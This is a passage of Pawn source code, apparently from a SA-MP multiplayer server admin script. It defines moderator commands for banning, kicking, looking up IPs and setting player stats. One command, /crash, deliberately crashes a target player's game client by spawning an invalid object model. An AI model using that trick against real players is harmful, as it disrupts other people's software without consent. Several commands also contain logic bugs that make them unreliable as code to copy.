           GameTextForPlayer(player1,"~g~Promoted", 2000, 3);
        }
        return PlayerPlaySound(player1,1057,0.0,0.0,0.0);
		} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
		}
		return 1;
}
CMD:unsetmoderator(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 5 || IsPlayerAdmin(playerid)) {
	new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "USAGE: /unsetmoderator [playerid]");
		new player1 = strval(tmp),string[128],string2[128], AdminN[24], Mname[24];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
		GetPlayerName(playerid, AdminN,sizeof( AdminN ));
		GetPlayerName(player1, Mname,sizeof( Mname ));
		new year,month,day;   getdate(year, month, day); new hour,minute,second; gettime(hour,minute,second);
        if(PlayerInfo[player1][Helper] == 0) return SendClientMessage(playerid,red,"Player is Not Help moderator");
        PlayerInfo[player1][Helper] = 0;
        format(string, sizeof(string), "Adminsitator %s Has Fired You from your Help moderator stats", AdminN);
        SendClientMessage(player1,blue,string);
        format(string2,sizeof(string2), "You Have Fired %s from Help moderator stats", Mname);
        SendClientMessage(playerid,blue,string2);
		CMDMessageToAdmins(playerid,"UNSETMODERATOR");
		format(string,sizeof(string),"Administrator %s has Fired %s as Help Moderator on %d/%d/%d at %d:%d:%d",AdminN, Mname, day, month, year, hour, minute, second);
		SaveToFile("AdminLog",string);
		if(PlayerInfo[playerid][Helper] == 1)
		{
          GameTextForPlayer(player1,"~r~Fired as Help moderator", 2000, 3);
          PlayerInfo[playerid][Helper] = 0;
        }
        return PlayerPlaySound(player1,1057,0.0,0.0,0.0);
		} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
		}
		return 1;
}
CMD:setcolour(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 2) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) {
			SendClientMessage(playerid, red, "USAGE: /setcolour [playerid] [Colour]");
			return SendClientMessage(playerid, red, "Colours: 0=black 1=white 2=red 3=orange 4=yellow 5=green 6=blue 7=purple 8=brown 9=pink");
		}
		new player1 = strval(tmp), Colour = strval(tmp2), string[128], colour[24];
		if(Colour > 9) return SendClientMessage(playerid, red, "Colours: 0=black 1=white 2=red 3=orange 4=yellow 5=green 6=blue 7=purple 8=brown 9=pink");
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
	        CMDMessageToAdmins(playerid,"SETCOLOUR");
			switch (Colour)
			{
			    case 0: { SetPlayerColor(player1,black); colour = "Black"; }
			    case 1: { SetPlayerColor(player1,COLOR_WHITE); colour = "White"; }
			    case 2: { SetPlayerColor(player1,red); colour = "Red"; }
			    case 3: { SetPlayerColor(player1,orange); colour = "Orange"; }
				case 4: { SetPlayerColor(player1,orange); colour = "Yellow"; }
				case 5: { SetPlayerColor(player1,COLOR_GREEN1); colour = "Green"; }
				case 6: { SetPlayerColor(player1,COLOR_BLUE); colour = "Blue"; }
				case 7: { SetPlayerColor(player1,COLOR_PURPLE); colour = "Purple"; }
				case 8: { SetPlayerColor(player1,COLOR_BROWN); colour = "Brown"; }
				case 9: { SetPlayerColor(player1,COLOR_PINK); colour = "Pink"; }
			}
			if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has set colour to '%s' ", pName(playerid), colour); SendClientMessage(player1,blue,string); }
			format(string, sizeof(string), "You have set \"%s's\" colour to '%s' ", pName(player1), colour);
   			return SendClientMessage(playerid,blue,string);
	    } else return SendClientMessage(playerid,red,"ERROR: Player is not connected");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}


CMD:setweather(playerid,params[]) {
         if(PlayerInfo[playerid][Level] >= 3) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "USAGE: /setweather [playerid] [weather id]");
		new player1 = strval(tmp), weather = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"SETWEATHER");
			format(string, sizeof(string), "You have set \"%s's\" weather to '%d", pName(player1), weather); SendClientMessage(playerid,blue,string);
			if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has set your weather to '%d'", pName(playerid), weather); SendClientMessage(player1,blue,string); }
			SetPlayerWeather(player1,weather); PlayerPlaySound(player1,1057,0.0,0.0,0.0);
   			return PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
	    } else return SendClientMessage(playerid,red,"ERROR: Player is not connected");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:setkills(playerid,params[]) {
         if(PlayerInfo[playerid][Level] >= 5) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "USAGE: /setkills [playerid] [kills]");
		new player1 = strval(tmp), weather = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"SETKILLS");
			format(string, sizeof(string), "You have set \"%s's\" Kills to '%d", pName(player1), weather); SendClientMessage(playerid,blue,string);
			if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has set your Kills to '%d'", pName(playerid), weather); SendClientMessage(player1,blue,string); }
			PlayerInfo[player1][Kills] = weather;
   			return PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
	    } else return SendClientMessage(playerid,red,"ERROR: Player is not connected");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:setdeaths(playerid,params[]) {
         if(PlayerInfo[playerid][Level] >= 5) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "USAGE: /setdeaths [playerid] [deaths]");
		new player1 = strval(tmp), weather = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"SETDEATHS");
			format(string, sizeof(string), "You have set \"%s's\" Deaths to '%d", pName(player1), weather); SendClientMessage(playerid,blue,string);
			if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has set your Deaths to '%d'", pName(playerid), weather); SendClientMessage(player1,blue,string); }
			PlayerInfo[player1][Deaths] = weather;
   			return PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
	    } else return SendClientMessage(playerid,red,"ERROR: Player is not connected");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}
CMD:async(playerid,params[]) {
         if(PlayerInfo[playerid][Level] >= 2) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if (isnull(tmp)) return SendClientMessage(playerid, red, "USAGE: /aync [playerid]");
		new player1 = strval(tmp);
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
        GetPlayerPos(playerid,XR,YR,ZR);
        SpawnPlayer(playerid);
        SetPlayerPos(playerid,XR,YR,ZR);
			CMDMessageToAdmins(playerid,"ASYNC");
	    } else return SendClientMessage(playerid,red,"ERROR: Player is not connected");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
	return 1;
}

CMD:afk(playerid,params[]) {
         if(PlayerInfo[playerid][Level] >= 1 || PlayerInfo[playerid][Helper] == 1) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp)) return SendClientMessage(playerid, red, "USAGE: /afk [playerid]");
		new player1 = strval(tmp);
		if(player1 == playerid) return SendClientMessage(playerid,red,"ERROR: You Can't use it on Your Self");
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
        new Player[24],string[128];
        GetPlayerName(player1,Player,sizeof(Player));
        format(string,sizeof(string),"%s Has Been Disconnect for Being Away From Keyboard [AFK]",Player);
        SendClientMessageToAll(red,string);
        Kick(player1);
			CMDMessageToAdmins(playerid,"AFK");
	    } else return SendClientMessage(playerid,red,"ERROR: Player is not connected");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
	return 1;
}

CMD:settime(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 3) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "USAGE: /settime [playerid] [hour]");
		new player1 = strval(tmp), time = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"SETTIME");
			format(string, sizeof(string), "You have set \"%s's\" time to %d:00", pName(player1), time); SendClientMessage(playerid,blue,string);
			if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has set your time to %d:00", pName(playerid), time); SendClientMessage(player1,blue,string); }
			PlayerPlaySound(player1,1057,0.0,0.0,0.0);
   			return SetPlayerTime(player1, time, 0);
	    } else return SendClientMessage(playerid,red,"ERROR: Player is not connected");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:setworld(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 3) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "USAGE: /setworld [playerid] [virtual world]");
		new player1 = strval(tmp), time = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
        CMDMessageToAdmins(playerid,"SETWORLD");
			format(string, sizeof(string), "You have set \"%s's\" virtual world to '%d'", pName(player1), time); SendClientMessage(playerid,blue,string);
			if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has set your virtual world to '%d' ", pName(playerid), time); SendClientMessage(player1,blue,string); }
			PlayerPlaySound(player1,1057,0.0,0.0,0.0);
   			return SetPlayerVirtualWorld(player1, time);
	    } else return SendClientMessage(playerid,red,"ERROR: Player is not connected");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:setinterior(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 3) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "USAGE: /setinterior [playerid] [interior]");
		new player1 = strval(tmp), time = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"SETINTERIOR");
			format(string, sizeof(string), "You have set \"%s's\" interior to '%d' ", pName(player1), time); SendClientMessage(playerid,blue,string);
			if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has set your interior to '%d' ", pName(playerid), time); SendClientMessage(player1,blue,string); }
			PlayerPlaySound(player1,1057,0.0,0.0,0.0);
   			return SetPlayerInterior(player1, time);
	    } else return SendClientMessage(playerid,red,"ERROR: Player is not connected");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:givecar(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 3 || IsPlayerAdmin(playerid)) {
		new carid, player1;
	    if(sscanf(params,"dd", player1, carid)) return SendClientMessage(playerid,red,"USAGE: /givecar [playerid] [car id]");
	    new playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
	    if(IsPlayerInAnyVehicle(player1)) return SendClientMessage(playerid,red,"ERROR: Player already has a vehicle");
	 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && player1 != playerid) {
			CMDMessageToAdmins(playerid,"GIVECAR");
			new Float:x, Float:y, Float:z;	GetPlayerPos(player1,x,y,z);
			CarSpawner(player1,carid);
			GetPlayerName(player1, playername, sizeof(playername));		GetPlayerName(playerid, adminname, sizeof(adminname));
			format(string,sizeof(string),"Administrator %s has given you a car",adminname);	SendClientMessage(player1,blue,string);
			format(string,sizeof(string),"You have given %s a car", playername); return SendClientMessage(playerid,blue,string);
		} else return SendClientMessage(playerid, red, "Player is not connected or is yourself");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:setmytime(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 1) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /setmytime [hour]");
		new time = strval(params), string[128];
		CMDMessageToAdmins(playerid,"SETMYTIME");
		format(string,sizeof(string),"You have set your time to %d:00", time); SendClientMessage(playerid,blue,string);
		return SetPlayerTime(playerid, time, 0);
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:force(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 3) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /force [playerid]");
		new player1 = strval(params), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"FORCE");
			if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has forced you into class selection", pName(playerid) ); SendClientMessage(player1,blue,string); }
			format(string,sizeof(string),"You have forced \"%s\" into class selection", pName(player1)); SendClientMessage(playerid,blue,string);
			ForceClassSelection(player1);
			return SetPlayerHealth(player1,0.0);
	    } else return SendClientMessage(playerid,red,"ERROR: Player is not connected");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:eject(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 3) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /eject [playerid]");
		new player1 = strval(params), string[128], Float:x, Float:y, Float:z;
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			if(IsPlayerInAnyVehicle(player1)) {
		       	CMDMessageToAdmins(playerid,"EJECT");
				if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has ejected you from your vehicle", pName(playerid) ); SendClientMessage(player1,blue,string); }
				format(string,sizeof(string),"You have ejected \"%s\" from their vehicle", pName(player1)); SendClientMessage(playerid,blue,string);
    		   	GetPlayerPos(player1,x,y,z);
				return SetPlayerPos(player1,x,y,z+3);
			} else return SendClientMessage(playerid,red,"ERROR: Player is not in a vehicle");
	    } else return SendClientMessage(playerid,red,"ERROR: Player is not connected");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:givemoney(playerid, params[])
{
    new id, money, string[128], string2[128],plName[24],aName[24];
	GetPlayerName(playerid,aName,sizeof(aName));
	GetPlayerName(id,plName,sizeof(plName));
    if(PlayerInfo[playerid][Level] >= 3)
    {
        if(sscanf(params,"ii",id,money)) return SendClientMessage(playerid,COLOR_WHITE,"USAGE: /givemoney [ID] [amount]");
        else
        GivePlayerMoney(id,money);
        format(string, sizeof(string),"You have give player %s %d$!", plName, money);
        SendClientMessage(playerid, yellow, string);
        format(string2 ,sizeof(string2),"Administrator %s has given you %d$!", aName, money);
        SendClientMessage(id, blue, string2);
    }
    return 1;
}

CMD:lockcar(playerid,params[]) {
	#pragma unused params
    if(PlayerInfo[playerid][Level] >= 2) {
	    if(IsPlayerInAnyVehicle(playerid)) {
		 	for(new i = 0; i < MAX_PLAYERS; i++) SetVehicleParamsForPlayer(GetPlayerVehicleID(playerid),i,false,true);
			CMDMessageToAdmins(playerid,"LOCKCAR");
			PlayerInfo[playerid][DoorsLocked] = 1;
			new string[128]; format(string,sizeof(string),"Administrator \"%s\" has locked his car", pName(playerid));
			return SendClientMessageToAll(blue,string);
		} else return SendClientMessage(playerid,red,"ERROR: You need to be in a vehicle to lock the doors");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:unlockcar(playerid,params[]) {
	#pragma unused params
    if(PlayerInfo[playerid][Level] >= 2) {
	    if(IsPlayerInAnyVehicle(playerid)) {
		 	for(new i = 0; i < MAX_PLAYERS; i++) SetVehicleParamsForPlayer(GetPlayerVehicleID(playerid),i,false,false);
			CMDMessageToAdmins(playerid,"UNLOCKCAR");
			PlayerInfo[playerid][DoorsLocked] = 0;
			new string[128]; format(string,sizeof(string),"Administrator \"%s\" has unlocked his car", pName(playerid));
			return SendClientMessageToAll(blue,string);
		} else return SendClientMessage(playerid,red,"ERROR: You need to be in a vehicle to lock the doors");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:burn(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 2) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /burn [playerid]");
		new player1 = strval(params), string[128], Float:x, Float:y, Float:z;
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"BURN");
			format(string, sizeof(string), "You have burnt \"%s\" ", pName(player1)); SendClientMessage(playerid,blue,string);
			if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has burnt you", pName(playerid)); SendClientMessage(player1,blue,string); }
			GetPlayerPos(player1, x, y, z);
			return CreateExplosion(x, y , z + 3, 1, 10);
	    } else return SendClientMessage(playerid,red,"ERROR: Player is not connected");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:spawn(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 2) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /spawn [playerid]");
		new player1 = strval(params), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"SPAWN");
			format(string, sizeof(string), "You have spawned \"%s\" ", pName(player1)); SendClientMessage(playerid,blue,string);
			if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has spawned you", pName(playerid)); SendClientMessage(player1,blue,string); }
			SetPlayerPos(player1, 0.0, 0.0, 0.0);
			return SpawnPlayer(player1);
	    } else return SendClientMessage(playerid,red,"ERROR: Player is not connected");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:disarm(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 2) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /disarm [playerid]");
		new player1 = strval(params), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"DISARM");  PlayerPlaySound(player1,1057,0.0,0.0,0.0);
			format(string, sizeof(string), "You have disarmed \"%s\" ", pName(player1)); SendClientMessage(playerid,blue,string);
			if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has disarmed you", pName(playerid)); SendClientMessage(player1,blue,string); }
			ResetPlayerWeapons(player1);
			return PlayerPlaySound(player1,1057,0.0,0.0,0.0);
	    } else return SendClientMessage(playerid,red,"ERROR: Player is not connected");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:d(playerid,params[]) {
	 return cmd_disarm(playerid, params);
}
//-----------------------------------------Commands-----------------------------
CMD:crash(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 4) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /crash [playerid]");
		new player1 = strval(params), string[128], Float:X,Float:Y,Float:Z;
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
   			CMDMessageToAdmins(playerid,"CRASH");
	        GetPlayerPos(player1,X,Y,Z);
	   		new objectcrash = CreatePlayerObject(player1,11111111,X,Y,Z,0,0,0);
			DestroyObject(objectcrash);
			format(string, sizeof(string), "You have crashed \"%s's\" game", pName(player1) );
			return SendClientMessage(playerid,blue, string);
	    } else return SendClientMessage(playerid,red,"ERROR: Player is not connected");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:ip(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 1 || PlayerInfo[playerid][Helper] == 1) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /ip [playerid]");
		new player1 = strval(params), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"IP");
			new tmp3[50]; GetPlayerIp(player1,tmp3,50);
			format(string,sizeof(string),"\"%s's\" ip is '%s'", pName(player1), tmp3);
			return SendClientMessage(playerid,blue,string);
	    } else return SendClientMessage(playerid,red,"ERROR: Player is not connected");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}
CMD:ipcheck(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 2) {
		new found, string[128], ip[50], playername[MAX_PLAYER_NAME];
		if(sscanf(params,"s[50]",ip)) return SendClientMessage(playerid,RED,"Correct USAGE: /rangecheck [ip]");
		CMDMessageToAdmins(playerid,"IPCHECK");
		format(string,sizeof(string),"Ip checked for: \"%s\" ",params);
		SendClientMessage(playerid,blue,string);
		for(new i=0; i <= MAX_PLAYERS; i++)
		{
			if(IsPlayerConnected(i))
			{
		    	GetPlayerIp(i, ip, 50);
				GetPlayerName(i, playername, sizeof(playername));
				new namelen = strlen(ip);
				new bool:searched=false;
				for(new pos=0; pos <= namelen; pos++)
				{
				    if(searched != true)
					{
                          if(strfind(ip,params,true) == pos)
					      {
								found++;
								format(string,sizeof(string),"%d. %s - %s(ID %d)",found,ip, playername, i);
								SendClientMessage(playerid, lightblue ,string);
								searched = true;
	                      }
					}
				}
			}
		}
		if(found == 0) SendClientMessage(playerid, blue, "No players have this ip");
	}
	else return SendClientMessage(playerid, RED,"ERROR: You need to be level 2 to use this command!");
	return 1;
}
CMD:unban(playerid, params[])
{
   if(PlayerInfo[playerid][Level] >= 2 || IsPlayerAdmin(playerid))
   {
	  new target[50];
	  if(sscanf(params,"s[50]", target)) return SendClientMessage(playerid, red,"[USAGE]: /unban [player name]");
	  CMDMessageToAdmins(playerid,"UNBAN");
	} else return SendClientMessage(playerid, RED,"ERROR: You need to be level 2 to use this command!");
 	return 1;
}

CMD:mcmds(playerid, params[])
{
SendClientMessage(playerid, -1,"Moderator Commands list:");
SendClientMessage(playerid, -1,"*************************");
SendClientMessage(playerid, -1,"/kick /warn /mcmds /ip");
SendClientMessage(playerid, -1,"/m [text] for moderator chat!");
SendClientMessage(playerid, -1,"/ls /lsof");
SendClientMessage(playerid, -1,"******************************");
return 1;
}
CMD:rban(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 4) {
		    new ip[128], tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
		    if(!strlen(params)) return SendClientMessage(playerid, red, "USAGE: /rban [playerid] [reason]");
			if(!strlen(tmp2)) return SendClientMessage(playerid, red, "ERROR: You must give a reason");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
			player1 = strval(tmp);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && player1 != playerid && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
				GetPlayerName(player1, playername, sizeof(playername)); GetPlayerName(playerid, adminname, sizeof(adminname));
				new year,month,day,hour,minuite,second; getdate(year, month, day); gettime(hour,minuite,second);
				CMDMessageToAdmins(playerid,"RBAN");
				format(string,sizeof(string),"%s has been range banned by Administrator %s [Reason: %s] [Date: %d/%d/%d] [Time: %d:%d]",playername,adminname,params[2],day,month,year,hour,minuite);
				SendClientMessageToAll(grey,string);
				SaveToFile("BanLog",string);
				print(string);
				if(udb_Exists(PlayerName2(player1)) && PlayerInfo[player1][LoggedIn] == 1) dUserSetINT(PlayerName2(player1)).("banned",1);
				GetPlayerIp(player1,ip,sizeof(ip));
	            strdel(ip,strlen(ip)-2,strlen(ip));
    	        format(ip,128,"%s**",ip);
				format(ip,128,"banip %s",ip);
            	SendRconCommand(ip);
				return 1;
			} else return SendClientMessage(playerid, red, "Player is not connected or is yourself or is the highest level admin");
		} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
	} else return SendClientMessage(playerid,red,"ERROR: You must be logged in to use this commands");
}

CMD:ban(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 2) {
		    new tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
		    if(!strlen(params)) return SendClientMessage(playerid, red, "USAGE:{FFFFFF} /Ban [playerid] [reason]");
			if(!strlen(tmp2)) return SendClientMessage(playerid, red, "USAGE:{FFFFFF} /Ban [playerid] [reason]");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
			player1 = strval(tmp);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && player1 != playerid && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
				GetPlayerName(player1, playername, sizeof(playername)); GetPlayerName(playerid, adminname, sizeof(adminname));
				new year,month,day,hour,minuite,second; getdate(year, month, day); gettime(hour,minuite,second);
				CMDMessageToAdmins(playerid,"BAN");
				format(string,sizeof(string),"*** Player %s has been banned by Administrator %s.",playername,adminname);
				SendClientMessageToAll(red,string);
				format(string,sizeof(string),"[Reason: %s]",params[2]);
				SendClientMessageToAll(red,string);
                SaveToFile("BanLog",string);
				print(string);
                if(udb_Exists(PlayerName2(player1)) && PlayerInfo[player1][LoggedIn] == 1) dUserSetINT(PlayerName2(player1)).("banned",1);
				format(string,sizeof(string),"banned by Administrator %s. Reason: %s", adminname, params[2] );
				return BanEx(player1,params[2]);
			} else return SendClientMessage(playerid, red, "Player is not connected or is yourself or is the highest level admin");
		} else return SendClientMessage(playerid,red,"ERROR:{FF9E00} You are not a high enough level to use this command");
